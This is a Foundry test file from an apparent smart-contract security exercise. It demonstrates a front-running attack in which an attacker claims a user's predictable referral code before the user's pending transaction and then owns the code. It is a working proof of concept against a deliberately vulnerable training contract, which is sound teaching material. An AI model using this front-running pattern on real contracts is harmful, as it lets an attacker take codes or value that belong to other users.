// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../../src/15. FrontRunning-2/Referrals.sol";

/**
 * @dev run "forge test --match-contract TestFR2 -vvv"
 */
contract TestFR2 is Test {
    Referrals public referrals;

    address deployer = makeAddr("deployer");
    address user = makeAddr("user");
    address attacker = makeAddr("attacker");

    bytes32 referralCode;

    function setUp() public {
        /**
         * SETUP EXERCISE - DON'T CHANGE ANYTHING HERE
         */
        vm.deal(deployer, 100 ether);
        vm.deal(user, 100 ether);
        vm.deal(attacker, 100 ether);

        // Deploy contract
        vm.startPrank(deployer);
        referrals = new Referrals();
        vm.stopPrank();

        // Send some random transactions
        for (uint256 i = 0; i < 100; i++) {
            vm.startPrank(deployer);
            address randomAddr = address(uint160(uint256(keccak256(abi.encodePacked(i)))));
            payable(randomAddr).transfer(0.01 ether);
            vm.stopPrank();
        }

        // Assign referral code to user
        referralCode = keccak256(abi.encodePacked(user));
    }

    function testFrontrunningAttack() public {
        // Simulate: User's transaction is pending in mempool
        // Attacker frontruns it

        vm.startPrank(attacker);
        // Attacker claims the referral code first
        referrals.createReferralCode(referralCode);
        vm.stopPrank();

        // Now if user tries to claim, it should fail
        vm.startPrank(user);
        vm.expectRevert("Referral code already exists");
        referrals.createReferralCode(referralCode);
        vm.stopPrank();

        // Verify attacker owns the code
        assertEq(referrals.getReferral(referralCode), attacker);
    }
}
